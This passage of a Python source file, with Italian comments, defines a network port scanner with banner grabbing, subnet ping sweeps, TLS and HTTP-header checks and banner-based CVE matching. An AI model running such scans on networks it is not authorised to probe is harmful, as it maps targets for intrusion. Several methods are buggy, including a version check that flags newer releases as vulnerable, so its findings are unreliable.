        print_colored(f"✅ Risultati esportati in '{filename}'.", Colors.SUCCESS)
    
    def estimate_scan_time(self, num_ports: int, timeout: float = 1.0) -> float:
        """
        Stima il tempo di scansione in base al numero di porte e al timeout.
        
        Args:
            num_ports (int): Numero di porte da scansionare.
            timeout (float): Timeout per ogni porta in secondi (default 1.0s).
        
        Returns:
            float: Tempo stimato in secondi.
        """
        scan_speed = 50  # Numero di porte che possono essere scansionate in parallelo
        estimated_time = (num_ports / scan_speed) * timeout
        return round(estimated_time, 2)  # Arrotonda a 2 decimali


    async def run_scan(self, target: str, start_port: int, end_port: int, timeout: float = 1.0, concurrent_scans: int = 50) -> None:
        """
        Esegue una scansione in modo asincrono con progress bar
        
        Args:
            target: Host target
            start_port: Porta iniziale
            end_port: Porta finale
            timeout: Timeout massimo per porta
            concurrent_scans: Numero massimo di scansioni parallele
        """
        try:
            print(f"\nScansione di {target} in corso...")

            # Inizializza self.results per evitare KeyError in show_network_results()
            self.results = {"devices": []}  

            # Stima il tempo prima di iniziare la scansione
            estimated_time = await self.estimate_scan_time(start_port, end_port, timeout, concurrent_scans)
            print(f"Tempo stimato: {estimated_time}")

            # Esegui la scansione
            results = await self.scan_target(target, start_port, end_port, timeout, concurrent_scans)

            # Mostra risultati finali
            print("\nScansione completata!")
            self.show_scan_results()
            
        except Exception as e:
            print(f"\nErrore durante la scansione: {str(e)}")


    async def menu(self):
        """Menu interattivo per il Port Scanner"""
        while True:
            print("\n=== Port Scanner Menu ===")
            print("1. Scansione veloce (porte comuni)")
            print("2. Scansione completa")
            print("3. Scansione intelligente")
            print("4. Scansione rete")
            print("5. Analisi servizio specifico")
            print("6. Scansione adattiva")
            print("7. Esporta ultimi risultati")
            print("0. Torna al menu principale")

            try:
                choice = await asyncio.to_thread(input, "\nSeleziona un'opzione: ")  

                if choice == "1":
                    await self.scan_fast()
                elif choice == "2":
                    await self.scan_full()
                elif choice == "3":
                    await self.scan_smart()
                elif choice == "4":
                    network = await asyncio.to_thread(input, "Inserisci rete in formato CIDR (es. 192.168.1.0/24): ")
                    if not network:
                        print("\nErrore: Formato rete non valido.")
                        continue
                    print("\nAvvio scansione rete...")
                    results = await self.scan_network(network)
                    print("\nRisultati scansione:")
                    print(self.format_results(results))
                elif choice == "5":
                    await self.scan_specific_service()
                elif choice == "6":
                    await self.scan_adaptive()
                elif choice == "7":
                    await self.export_results()
                elif choice == "0":
                    break
                else:
                    print_colored("\nOpzione non valida. Riprova.", Colors.WARNING)

            except KeyboardInterrupt:
                print_colored("\nUscita forzata. Tornando al menu principale...", Colors.WARNING)
                break  # Permette uscita sicura con Ctrl+C
            except Exception as e:
                print_colored(f"\nErrore: {str(e)}", Colors.DANGER)


    async def scan_port(self, target: str, port: int, timeout: float = 1.0) -> Optional[Dict]:
        """
        Scansiona una singola porta usando socket asincrono.

        Args:
            target: Host target
            port: Porta da scansionare
            timeout: Timeout in secondi

        Returns:
            Dict con informazioni sulla porta se aperta, None altrimenti
        """
        reader, writer = None, None  # Inizializza le variabili per evitare UnboundLocalError

        try:
            start_time = time.time()

            # Apertura di connessione asincrona
            reader, writer = await asyncio.open_connection(target, port)
            response_time = time.time() - start_time

            # Se la connessione è riuscita, raccogli informazioni sulla porta
            service_info = self._get_service_info(port)

            # Tentativo di banner grabbing
            banner = await self._grab_banner(reader, writer) if reader else None

            port_info = {
                'port': port,
                'state': 'open',
                'service': service_info.get('service', 'unknown'),
                'description': service_info.get('description', ''),
                'risk': service_info.get('risk', 'Unknown'),
                'response_time': f"{response_time:.3f}s",
                'banner': banner
            }

            # Aggiunta informazioni sul processo locale se disponibili
            try:
                process_info = self._get_process_info(port)
                if process_info:
                    port_info.update(process_info)
            except Exception as e:
                self.logger.warning(f"Errore ottenendo informazioni sul processo per porta {port}: {str(e)}")

            return port_info

        except (asyncio.TimeoutError, ConnectionRefusedError):
            return None  # Porta chiusa o host non risponde

        except Exception as e:
            self.logger.debug(f"Errore scanning porta {port}: {str(e)}")

        finally:
            if writer is not None:  # Controllo esplicito per evitare errori
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass  # Evita errori se la chiusura fallisce

        return None



    async def _grab_banner(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> Optional[str]:
        try:
            writer.write(b'HELP\r\n')
            await writer.drain()
            banner = await reader.read(1024)
            return banner.decode().strip()
        except:
            return None


    def _get_service_info(self, port: int) -> Dict[str, str]:
        """
        Ottiene informazioni su un servizio dato il numero di porta
        
        Args:
            port: Numero porta
            
        Returns:
            Dict con informazioni sul servizio
        """
        if port in self.known_ports:
            return self.known_ports[port]
        
        try:
            service_name = socket.getservbyport(port)
            return {
                'service': service_name,
                'description': f'Servizio standard porta {port}',
                'risk': 'Unknown'
            }
        except:
            return {
                'service': 'unknown',
                'description': f'Servizio sconosciuto porta {port}',
                'risk': 'Unknown'
            }

    def _get_process_info(self, port: int) -> Optional[Dict]:
        """
        Ottiene informazioni sul processo che usa una porta
        
        Args:
            port: Numero porta
        
        Returns:
            Dict con informazioni sul processo se trovato, None altrimenti
        """
        try:
            # Ottieni tutte le connessioni attive
            connections = psutil.net_connections(kind='inet')

            for conn in connections:
                if conn.laddr.port == port and conn.pid:
                    try:
                        process = psutil.Process(conn.pid)
                        return {
                            'process_name': process.name(),
                            'process_id': process.pid,
                            'process_user': process.username(),
                            'process_status': process.status(),
                            'process_cpu': f"{process.cpu_percent(interval=0.1)}%",  # Evita blocchi lunghi
                            'process_memory': f"{process.memory_percent():.1f}%"
                        }
                    except (psutil.NoSuchProcess, psutil.ZombieProcess):
                        return None  # Il processo non esiste più
                    except psutil.AccessDenied:
                        self._log_error(f"Accesso negato a process {conn.pid}. Esegui come amministratore.")
                        return None

        except psutil.AccessDenied:
            self._log_error("Accesso negato a psutil.net_connections. Esegui il programma come amministratore.")
            return None
        except Exception as e:
            self._log_error(f"Errore in net_connections: {str(e)}")
            return None

        return None  # Nessun processo trovato per la porta

    async def scan_target(self, target: str, start_port: int = 1, end_port: int = 1024,  
                      timeout: float = 1.0, concurrent_scans: int = 50, 
                      progress_callback: Optional[Callable[[float], None]] = None) -> Dict:
        """
        Esegue scansione porte su target specificato in modo asincrono.

        Args:
            target: Host target
            start_port: Porta iniziale
            end_port: Porta finale
            timeout: Timeout per ogni porta
            concurrent_scans: Numero di scansioni concorrenti
            progress_callback: Funzione opzionale per aggiornare il progresso

        Returns:
            Dict con risultati della scansione
        """
        total_ports = end_port - start_port + 1  # Definizione iniziale per evitare errori

        try:
            # Risolvi hostname e IP
            try:
                target_ip = socket.gethostbyname(target)
                hostname = socket.gethostbyaddr(target_ip)[0]
            except (socket.herror, socket.gaierror):
                self.logger.error(f"Errore: impossibile risolvere l'host '{target}'")
                return {
                    'error': "Impossibile risolvere il nome host",
                    'target': target,
                    'ip': "Unknown",
                    'hostname': "Unknown",
                    'start_port': start_port,
                    'end_port': end_port,
                    'scan_time': "N/A",
                    'total_ports': 0,
                    'open_ports': 0,
                    'ports': []
                }

            self.logger.info(f"Avvio scansione su {target} ({target_ip})")

            start_time = time.time()
            self.scan_active = True
            self.scan_progress = 0

            # Crea lista delle porte da scansionare
            ports = list(range(start_port, end_port + 1))
            
            # Usa un semaforo globale per limitare scansioni concorrenti
            semaphore = asyncio.Semaphore(concurrent_scans)

            # Lista per memorizzare porte aperte
            open_ports = []

            # Scansiona le porte progressivamente con aggiornamento dello stato
            for i, port in enumerate(ports, start=1):
                async with semaphore:
                    result = await self.scan_port(target_ip, port, timeout)
                
                if isinstance(result, dict):  # Se la porta è aperta, salva il risultato
                    open_ports.append(result)
                elif isinstance(result, Exception):  # Logga eventuali errori
                    self.logger.error(f"Errore nella scansione della porta {port}: {str(result)}")

                # Aggiorna la percentuale di progresso
                self.scan_progress = (i / total_ports) * 100

                # Se c'è una funzione di callback per il progresso, chiamala
                if progress_callback:
                    progress_callback(self.scan_progress)

            # Aggiorna stato finale della scansione
            scan_time = time.time() - start_time

            results = {
                'target': target,
                'ip': target_ip,
                'hostname': hostname,
                'start_port': start_port,
                'end_port': end_port,
                'scan_time': f"{scan_time:.2f}s",
                'total_ports': total_ports,
                'open_ports': len(open_ports),
                'ports': sorted(open_ports, key=lambda x: x['port'])
            }

            self.results = results
            return results

        except Exception as e:
            self.logger.error(f"Errore durante la scansione: {str(e)}")
            return {
                'error': str(e),
                'target': target,
                'ip': target,
                'hostname': 'Unknown',
                'start_port': start_port,
                'end_port': end_port,
                'scan_time': 'N/A',
                'total_ports': total_ports,
                'open_ports': 0,
                'ports': []
            }

        finally:
            self.scan_active = False
            self.scan_progress = 100





    def get_scan_progress(self) -> Tuple[bool, float]:
        """
        Restituisce lo stato attuale della scansione
        
        Returns:
            Tuple con stato attivo e percentuale completamento
        """
        return self.scan_active, self.scan_progress
    
    def format_results(self, results: Dict, format_type: str = 'text') -> str:
        """
        Formatta i risultati della scansione nel formato richiesto
        
        Args:
            results: Risultati della scansione
            format_type: Tipo di formato ('text', 'json', 'html')
            
        Returns:
            Stringa formattata con i risultati
        """
        if format_type == 'text':
            # Formato testo semplice
            output = []
            output.append(f"\nRisultati scansione per {results['target']} ({results['ip']})")
            output.append(f"Hostname: {results['hostname']}")
            output.append(f"Tempo scansione: {results['scan_time']}")
            output.append(f"Porte scansionate: {results['total_ports']} ({results['start_port']}-{results['end_port']})")
            output.append(f"Porte aperte trovate: {results['open_ports']}\n")
            
            if results['ports']:
                output.append("PORTE APERTE:")
                output.append("-" * 80)
                output.append(f"{'PORTA':<10}{'SERVIZIO':<15}{'STATO':<10}{'RISCHIO':<10}{'DETTAGLI':<35}")
                output.append("-" * 80)
                
                for port_info in results['ports']:
                    port_line = f"{port_info['port']:<10}"
                    port_line += f"{port_info['service']:<15}"
                    port_line += f"{port_info['state']:<10}"
                    port_line += f"{port_info['risk']:<10}"
                    
                    details = []
                    if port_info.get('banner'):
                        details.append(f"Banner: {port_info['banner']}")
                    if port_info.get('process_name'):
                        details.append(f"Process: {port_info['process_name']} (PID: {port_info['process_id']})")
                    
                    port_line += f"{' '.join(details):<35}"
                    output.append(port_line)
                    
                    # Aggiungi descrizione su nuova linea se presente
                    if port_info.get('description'):
                        output.append(f"    → {port_info['description']}")
                
            return '\n'.join(output)
            
        elif format_type == 'json':
            return json.dumps(results, indent=2)
            
        elif format_type == 'html':
            # Formato HTML per report
            html = []
            html.append("<html><head><style>")
            html.append("table { border-collapse: collapse; width: 100%; }")
            html.append("th, td { padding: 8px; text-align: left; border: 1px solid #ddd; }")
            html.append("th { background-color: #f2f2f2; }")
            html.append("tr:nth-child(even) { background-color: #f9f9f9; }")
            html.append("</style></head><body>")
            
            html.append(f"<h2>Scan Results: {results['target']} ({results['ip']})</h2>")
            html.append(f"<p>Hostname: {results['hostname']}</p>")
            html.append(f"<p>Scan Time: {results['scan_time']}</p>")
            html.append(f"<p>Ports Scanned: {results['total_ports']} ({results['start_port']}-{results['end_port']})</p>")
            html.append(f"<p>Open Ports Found: {results['open_ports']}</p>")
            
            if results['ports']:
                html.append("<table>")
                html.append("<tr><th>Port</th><th>Service</th><th>State</th><th>Risk</th><th>Details</th></tr>")
                
                for port_info in results['ports']:
                    details = []
                    if port_info.get('banner'):
                        details.append(f"Banner: {port_info['banner']}")
                    if port_info.get('process_name'):
                        details.append(f"Process: {port_info['process_name']} (PID: {port_info['process_id']})")
                    if port_info.get('description'):
                        details.append(f"Description: {port_info['description']}")
                        
                    html.append("<tr>")
                    html.append(f"<td>{port_info['port']}</td>")
                    html.append(f"<td>{port_info['service']}</td>")
                    html.append(f"<td>{port_info['state']}</td>")
                    html.append(f"<td>{port_info['risk']}</td>")
                    html.append(f"<td>{' | '.join(details)}</td>")
                    html.append("</tr>")
                    
                html.append("</table>")
            html.append("</body></html>")
            
            return '\n'.join(html)
        else:
            raise ValueError(f"Formato non supportato: {format_type}")

    async def quick_scan(self, target: str) -> Dict:
        """
        Esegue una scansione rapida delle porte più comuni
        
        Args:
            target: Host target
            
        Returns:
            Dict con risultati della scansione
        """
        common_ports = [
            20, 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
            993, 995, 1723, 3306, 3389, 5900, 8080
        ]
        
        results = {
            'target': target,
            'scan_type': 'quick',
            'ports': []
        }
        
        for port in common_ports:
            port_info = await self.scan_port(target, port)
            if port_info:
                results['ports'].append(port_info)
                
        return results

    async def service_detection(self, target: str, port: int) -> Dict:
        """
        Esegue il rilevamento approfondito del servizio su una porta
        
        Args:
            target: Host target
            port: Porta da analizzare
            
        Returns:
            Dict con informazioni dettagliate sul servizio
        """
        service_info = {}
        
        try:
            # Prova diversi metodi per identificare il servizio
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            
            # Prova vari payload per identificare il servizio
            payloads = {
                'HTTP': b'GET / HTTP/1.0\r\n\r\n',
                'FTP': b'USER anonymous\r\n',
                'SMTP': b'HELO test\r\n',
                'POP3': b'USER test\r\n',
                'SSH': b'SSH-2.0-OpenSSH_test\r\n'
            }
            
            for protocol, payload in payloads.items():
                try:
                    sock.send(payload)
                    response = sock.recv(1024)
                    if response:
                        service_info['protocol'] = protocol
                        service_info['banner'] = response.decode('utf-8', errors='ignore').strip()
                        break
                except:
                    continue
                    
            # Aggiungi informazioni SSL/TLS se disponibili
            if port in [443, 465, 993, 995]:
                try:
                    context = ssl.create_default_context()
                    with context.wrap_socket(sock, server_hostname=target) as ssock:
                        cert = ssock.getpeercert()
                        service_info['ssl_cert'] = {
                            'subject': dict(x[0] for x in cert['subject']),
                            'issuer': dict(x[0] for x in cert['issuer']),
                            'version': cert['version'],
                            'expires': cert['notAfter']
                        }
                except:
                    service_info['ssl_cert'] = None
                    
        except Exception as e:
            service_info['error'] = str(e)
            
        finally:
            sock.close()
            
        return service_info

    def analyze_security(self, results: Dict) -> List[Dict]:
        """
        Analizza i risultati della scansione per identificare problemi di sicurezza e valutare il rischio.
        
        Args:
            results: Dizionario con i risultati della scansione.

        Returns:
            Lista di problemi di sicurezza e valutazione del rischio per ciascuna porta aperta.
        """
        security_issues = []

        for port_info in results.get('ports', []):
            port = port_info['port']
            service = port_info.get('service', 'unknown')
            risk_level = "UNKNOWN"
            risk_score = 0
            findings = []
            recommendations = []

            # Determinazione rischio base per numero porta
            if port < 1024:
                risk_score += 2
                findings.append(f"La porta {port} è una porta di sistema (privilegiata).")

            # Rischio basato sul servizio noto
            if port in self.known_ports:
                service_risk = self.known_ports[port].get('risk', 'UNKNOWN')

                if service_risk == 'Critico':
                    risk_score += 5
                    findings.append(f"Il servizio {service} è considerato critico e insicuro.")
                    recommendations.append("Considerare la disattivazione o la sostituzione con un'alternativa più sicura.")
                elif service_risk == 'Alto':
                    risk_score += 4
                    findings.append(f"Il servizio {service} è considerato ad alto rischio.")
                    recommendations.append("Limitare l'accesso solo a IP fidati e mantenere il servizio aggiornato.")
                elif service_risk == 'Medio':
                    risk_score += 3
                    findings.append(f"Il servizio {service} potrebbe rappresentare un rischio moderato.")
                    recommendations.append("Verificare la necessità di questo servizio e applicare configurazioni sicure.")
                elif service_risk == 'Basso':
                    risk_score += 1
                    findings.append(f"Il servizio {service} ha un rischio basso, ma deve comunque essere monitorato.")

            # Valutazione SSL/TLS
            if 'ssl_info' in port_info:
                ssl_issues = port_info.get('ssl_info', {}).get('issues', [])
                if ssl_issues:
                    risk_score += len(ssl_issues)
                    findings.extend(ssl_issues)
                    recommendations.append("Aggiornare il certificato SSL/TLS e verificare la configurazione di sicurezza.")

            # Valutazione di sicurezza basata su header HTTP
            if 'security_headers' in port_info:
                missing_headers = port_info.get('issues', [])
                if missing_headers:
                    risk_score += len(missing_headers) // 2
                    findings.extend(missing_headers)
                    recommendations.append("Aggiungere gli header di sicurezza HTTP mancanti.")

            # Determinazione finale del livello di rischio
            if risk_score >= 8:
                risk_level = 'CRITICAL'
            elif risk_score >= 6:
                risk_level = 'HIGH'
            elif risk_score >= 4:
                risk_level = 'MEDIUM'
            elif risk_score >= 2:
                risk_level = 'LOW'
            else:
                risk_level = 'INFO'

            # Costruzione del report di sicurezza
            security_issues.append({
                'port': port,
                'service': service,
                'risk_level': risk_level,
                'risk_score': risk_score,
                'findings': findings,
                'recommendations': recommendations
            })

        return security_issues

    

    def export_results(self, results: Dict, filename: str, format_type: str = 'txt') -> None:
        """
        Esporta i risultati della scansione in un file
        
        Args:
            results: Risultati della scansione
            filename: Nome del file di output
            format_type: Formato del file (txt, json, html, csv)
        """
        try:
            formatted_results = self.format_results(results, format_type)
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(formatted_results)
            self.logger.info(f"Risultati esportati in: {filename}")
        except Exception as e:
            self.logger.error(f"Errore durante l'esportazione: {str(e)}")
            raise

    async def scan_network(self, network: str, ports: List[int] = None) -> List[Dict]:
        """
        Scansiona un'intera subnet
        
        Args:
            network: Subnet in formato CIDR (es. 192.168.1.0/24)
            ports: Lista di porte da scansionare (default: porte comuni)
            
        Returns:
            Lista di risultati per ogni host
        """
        try:
            # Parse CIDR notation
            network = ipaddress.ip_network(network)
            
            if ports is None:
                ports = [20, 21, 22, 23, 25, 53, 80, 443, 3389]  # Porte comuni
                
            results = []
            total_hosts = len(list(network.hosts()))
            
            self.logger.info(f"Avvio scansione rete {network}, {total_hosts} hosts")
            
            for i, ip in enumerate(network.hosts(), 1):
                ip_str = str(ip)
                self.logger.debug(f"Scansione {ip_str} ({i}/{total_hosts})")
                
                # Verifica se l'host è attivo
                if await self._is_host_alive(ip_str):
                    scan_result = await self.quick_scan(ip_str)
                    results.append(scan_result)
                
                # Aggiorna progresso
                self.scan_progress = (i / total_hosts) * 100
                
            return results
            
        except Exception as e:
            self.logger.error(f"Errore durante la scansione della rete: {str(e)}")
            raise

    async def _is_host_alive(self, ip: str) -> bool:
        """
        Verifica se un host è attivo usando ICMP ping
        
        Args:
            ip: Indirizzo IP da verificare
            
        Returns:
            True se l'host risponde, False altrimenti
        """
        try:
            if os.name == 'nt':  # Windows
                ping_cmd = ['ping', '-n', '1', '-w', '1000', ip]
            else:  # Linux/Unix
                ping_cmd = ['ping', '-c', '1', '-W', '1', ip]
                
            process = await asyncio.create_subprocess_exec(
                *ping_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            _, _ = await process.communicate()
            return process.returncode == 0
            
        except:
            return False

    async def fingerprint_service(self, target: str, port: int) -> Dict:
        """
        Esegue un fingerprinting approfondito del servizio
        
        Args:
            target: Host target
            port: Porta da analizzare
            
        Returns:
            Dict con informazioni dettagliate sul servizio
        """
        service_info = {
            'port': port,
            'basic_info': {},
            'advanced_info': {},
            'vulnerabilities': [],
            'recommendations': []
        }
        
        try:
            # Informazioni base
            basic_info = await self.scan_port(target, port)
            if basic_info:
                service_info['basic_info'] = basic_info
            
            # Rilevamento versione
            version_info = await self.service_detection(target, port)
            service_info['advanced_info'] = version_info
            
            # Analisi sicurezza
            if port in self.known_ports:
                known_service = self.known_ports[port]
                service_info['recommendations'].extend(self._get_security_recommendations(port, known_service))
            
            # Controlla vulnerabilità note
            service_info['vulnerabilities'] = await self._check_known_vulnerabilities(
                target, port, version_info.get('banner', '')
            )
            
        except Exception as e:
            service_info['error'] = str(e)
            
        return service_info

    def _get_security_recommendations(self, port: int, service_info: Dict) -> List[str]:
        """
        Genera raccomandazioni di sicurezza per un servizio
        
        Args:
            port: Numero porta
            service_info: Informazioni sul servizio
            
        Returns:
            Lista di raccomandazioni
        """
        recommendations = []
        
        # Raccomandazioni basate sul tipo di servizio
        if service_info['risk'] == 'Critico':
            recommendations.append(f"CRITICO: Il servizio {service_info['service']} sulla porta {port} è considerato non sicuro")
            recommendations.append(f"Raccomandazione: Disabilitare il servizio o sostituirlo con un'alternativa sicura")
            
        elif service_info['risk'] == 'Alto':
            recommendations.append(f"IMPORTANTE: Il servizio {service_info['service']} richiede particolare attenzione")
            recommendations.append("Raccomandazione: Limitare l'accesso a IP fidati e monitorare attivamente")
            
        elif service_info['risk'] == 'Medio':
            recommendations.append(f"ATTENZIONE: Verificare la necessità del servizio {service_info['service']}")
            recommendations.append("Raccomandazione: Configurare correttamente e mantenere aggiornato")
            
        # Raccomandazioni specifiche per porta
        if port in [21, 23, 69]:  # Servizi non sicuri
            recommendations.append("Utilizzare alternative sicure (SFTP, SSH, etc.)")
            recommendations.append("Abilitare la crittografia se possibile")
            
        elif port in [22, 3389]:  # Servizi amministrativi
            recommendations.append("Limitare l'accesso a IP specifici")
            recommendations.append("Utilizzare autenticazione a due fattori")
            recommendations.append("Monitorare i tentativi di accesso")
            
        elif port in [80, 443]:  # Web
            recommendations.append("Mantenere aggiornato il web server")
            recommendations.append("Utilizzare HTTPS con certificati validi")
            recommendations.append("Implementare WAF e altre misure di sicurezza web")
            
        elif port in [1433, 3306, 5432]:  # Database
            recommendations.append("Bloccare l'accesso diretto dall'esterno")
            recommendations.append("Utilizzare connessioni cifrate")
            recommendations.append("Implementare policy di password robuste")
            
        return recommendations

    async def _check_known_vulnerabilities(self, target: str, port: int, banner: str) -> List[Dict]:
        """
        Controlla vulnerabilità note per il servizio
        
        Args:
            target: Host target
            port: Numero porta
            banner: Banner del servizio
            
        Returns:
            Lista di vulnerabilità trovate
        """
        vulnerabilities = []
        
        # Definizione pattern di vulnerabilità note
        vulnerability_patterns = {
            'apache': {
                'pattern': r'Apache/([0-9.]+)',
                'checks': [
                    {'version': '2.4.49', 'cve': 'CVE-2021-41773', 'description': 'Path Traversal Vulnerability'},
                    {'version': '2.4.50', 'cve': 'CVE-2021-42013', 'description': 'Path Traversal Vulnerability'}
                ]
            },
            'nginx': {
                'pattern': r'nginx/([0-9.]+)',
                'checks': [
                    {'version': '1.20.0', 'cve': 'CVE-2021-23017', 'description': 'Buffer Overflow'}
                ]
            },
            'openssh': {
                'pattern': r'OpenSSH[_-]([0-9.]+)',
                'checks': [
                    {'version': '7.2p1', 'cve': 'CVE-2016-6515', 'description': 'DOS Vulnerability'}
                ]
            }
        }
        
        if banner:
            for service, info in vulnerability_patterns.items():
                match = re.search(info['pattern'], banner)
                if match:
                    version = match.group(1)
                    for check in info['checks']:
                        if self._is_vulnerable_version(version, check['version']):
                            vulnerabilities.append({
                                'service': service,
                                'version': version,
                                'cve': check['cve'],
                                'description': check['description'],
                                'recommendation': 'Aggiornare alla versione più recente'
                            })
        
        return vulnerabilities

    def _is_vulnerable_version(self, current: str, vulnerable: str) -> bool:
        """
        Confronta versioni per determinare se la versione corrente è vulnerabile
        
        Args:
            current: Versione corrente
            vulnerable: Versione vulnerabile
            
        Returns:
            True se la versione corrente è vulnerabile
        """
        try:
            current_parts = [int(x) for x in current.split('.')]
            vulnerable_parts = [int(x) for x in vulnerable.split('.')]
            
            for i in range(max(len(current_parts), len(vulnerable_parts))):
                current_part = current_parts[i] if i < len(current_parts) else 0
                vulnerable_part = vulnerable_parts[i] if i < len(vulnerable_parts) else 0
                
                if current_part < vulnerable_part:
                    return False
                elif current_part > vulnerable_part:
                    return True
                    
            return True  # Versioni uguali
            
        except:
            return False  # In caso di errore, assumiamo non vulnerabile
   
    def analyze_traffic_pattern(self, target_ip: str, duration: int = 10) -> Dict:
        """Analizza il traffico di rete di un dispositivo per un periodo di tempo specificato."""
        try:
            print_colored(f"📡 Analizzando traffico su {target_ip} per {duration} secondi...", Colors.INFO)
            start_time = time.time()
            traffic_data = {
                'bytes_sent': [],
                'bytes_recv': [],
                'packets_sent': [],
                'packets_recv': [],
                'connections': []
            }

            initial_stats = psutil.net_io_counters()

            while time.time() - start_time < duration:
                # Raccogli statistiche attuali
                current_stats = psutil.net_io_counters()

                # Calcola variazioni di traffico
                traffic_data['bytes_sent'].append(current_stats.bytes_sent - initial_stats.bytes_sent)
                traffic_data['bytes_recv'].append(current_stats.bytes_recv - initial_stats.bytes_recv)
                traffic_data['packets_sent'].append(current_stats.packets_sent - initial_stats.packets_sent)
                traffic_data['packets_recv'].append(current_stats.packets_recv - initial_stats.packets_recv)

                # Monitora connessioni attive verso l'IP target
                active_conns = [conn for conn in psutil.net_connections() if conn.raddr and conn.raddr.ip == target_ip]
                traffic_data['connections'].append(len(active_conns))

                time.sleep(1)

            # Calcola statistiche medie
            return {
                'avg_bytes_sent': round(statistics.mean(traffic_data['bytes_sent']), 2),
                'avg_bytes_recv': round(statistics.mean(traffic_data['bytes_recv']), 2),
                'max_bytes_sent': max(traffic_data['bytes_sent']),
                'max_bytes_recv': max(traffic_data['bytes_recv']),
                'total_packets_sent': sum(traffic_data['packets_sent']),
                'total_packets_recv': sum(traffic_data['packets_recv']),
                'avg_connections': round(statistics.mean(traffic_data['connections']), 2),
                'max_connections': max(traffic_data['connections'])
            }

        except Exception as e:
            print_colored(f"❌ Errore nell'analisi del traffico: {str(e)}", Colors.DANGER)
            return {}

    async def perform_service_fingerprinting(self, target: str, port: int) -> Dict:
        """
        Esegue un fingerprinting approfondito del servizio utilizzando varie tecniche
        
        Args:
            target: Host target
            port: Porta da analizzare
            
        Returns:
            Dict con informazioni dettagliate sul servizio
        """
        results = {
            'service_info': {},
            'ssl_info': {},
            'headers': {},
            'response_analysis': {}
        }
        
        try:
            # Test base del servizio
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            
            # Test SSL/TLS
            if port in [443, 465, 993, 995, 8443]:
                try:
                    context = ssl.create_default_context()
                    with context.wrap_socket(sock, server_hostname=target) as ssock:
                        results['ssl_info'] = {
                            'version': ssock.version(),
                            'cipher': ssock.cipher(),
                            'cert': self._analyze_ssl_cert(ssock.getpeercert())
                        }
                except ssl.SSLError as e:
                    results['ssl_info']['error'] = str(e)
                    
            # Test HTTP(S)
            if port in [80, 443, 8080, 8443]:
                try:
                    protocol = 'https' if port in [443, 8443] else 'http'
                    response = self.request_handler.safe_request(
                        'GET',
                        f'{protocol}://{target}:{port}',
                        timeout=5,
                        verify=False,
                        headers={'User-Agent': 'Mozilla/5.0'}
                    )
                    results['headers'] = dict(response.headers)
                    results['response_analysis'] = self._analyze_http_response(response)
                except requests.exceptions.RequestException as e:
                    results['headers']['error'] = str(e)
                    
            # Test banner grabbing avanzato
            results['service_info'] = await self._advanced_banner_grab(sock)
            
        except Exception as e:
            self.logger.error(f"Errore nel fingerprinting: {str(e)}")
            
        finally:
            sock.close()
            
        return results

    def _analyze_ssl_cert(self, cert: Dict) -> Dict:
        """
        Analizza un certificato SSL/TLS
        
        Args:
            cert: Certificato SSL/TLS
            
        Returns:
            Dict con analisi del certificato
        """
        if not cert:
            return {'error': 'Nessun certificato trovato'}
            
        analysis = {
            'subject': dict(x[0] for x in cert.get('subject', [])),
            'issuer': dict(x[0] for x in cert.get('issuer', [])),
            'version': cert.get('version', 0),
            'serialNumber': cert.get('serialNumber', ''),
            'notBefore': cert.get('notBefore', ''),
            'notAfter': cert.get('notAfter', ''),
            'issues': []
        }
        
        # Verifica problemi comuni
        now = datetime.now()
        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        
        if now > not_after:
            analysis['issues'].append('Certificato scaduto')
        elif (not_after - now).days < 30:
            analysis['issues'].append('Certificato in scadenza')
            
        if cert.get('version') < 3:
            analysis['issues'].append('Versione SSL/TLS obsoleta')
            
        return analysis

    def _analyze_http_response(self, response: requests.Response) -> Dict:
        """
        Analizza una risposta HTTP per identificare il server e potenziali vulnerabilità
        
        Args:
            response: Oggetto Response di requests
            
        Returns:
            Dict con analisi della risposta
        """
        analysis = {
            'server': response.headers.get('Server', 'Unknown'),
            'security_headers': {},
            'issues': []
        }
        
        # Verifica header di sicurezza
        security_headers = {
            'Strict-Transport-Security': 'HSTS non configurato',
            'X-Frame-Options': 'Protezione clickjacking non configurata',
            'X-Content-Type-Options': 'MIME-sniffing non protetto',
            'X-XSS-Protection': 'Protezione XSS non configurata',
            'Content-Security-Policy': 'CSP non configurato'
        }
        
        for header, message in security_headers.items():
            if header in response.headers:
                analysis['security_headers'][header] = response.headers[header]
            else:
                analysis['issues'].append(message)
                
        # Analizza cookies
        if 'Set-Cookie' in response.headers:
            cookies = response.headers.get_all('Set-Cookie')
            secure_cookie = False
            httponly_cookie = False
            
            for cookie in cookies:
                if 'secure' in cookie.lower():
                    secure_cookie = True
                if 'httponly' in cookie.lower():
                    httponly_cookie = True
                    
            if not secure_cookie:
                analysis['issues'].append('Cookie non sicuri (manca flag Secure)')
            if not httponly_cookie:
                analysis['issues'].append('Cookie non protetti (manca flag HttpOnly)')
                
        return analysis

    async def _advanced_banner_grab(self, sock: socket.socket) -> Dict:
        """
        Esegue banner grabbing avanzato con vari payload
        
        Args:
            sock: Socket connesso
            
        Returns:
            Dict con informazioni ottenute
        """
        results = {'banners': {}}
        
        # Payload per diversi protocolli
        payloads = {
            'NULL': b'',
            'HTTP': b'GET / HTTP/1.0\r\n\r\n',
            'FTP': b'USER anonymous\r\n',
            'SMTP': b'EHLO test\r\n',
            'POP3': b'CAPA\r\n',
            'IMAP': b'A001 CAPABILITY\r\n',
            'SSH': b'SSH-2.0-OpenSSH_test\r\n',
            'TELNET': b'\xff\xfb\x01\xff\xfb\x03\xff\xfd\x0f\xff\xfd\x18',
        }
        
        for protocol, payload in payloads.items():
            try:
                sock.send(payload)
                response = sock.recv(1024)
                if response:
                    results['banners'][protocol] = response.decode('utf-8', errors='ignore').strip()
            except:
                continue
                
        # Analizza i banner ricevuti
        for protocol, banner in results['banners'].items():
            version_info = self._extract_version_info(protocol, banner)
            if version_info:
                results[f'{protocol.lower()}_version'] = version_info
                
        return results

    def _extract_version_info(self, protocol: str, banner: str) -> Optional[Dict]:
        """
        Estrae informazioni di versione da un banner
        
        Args:
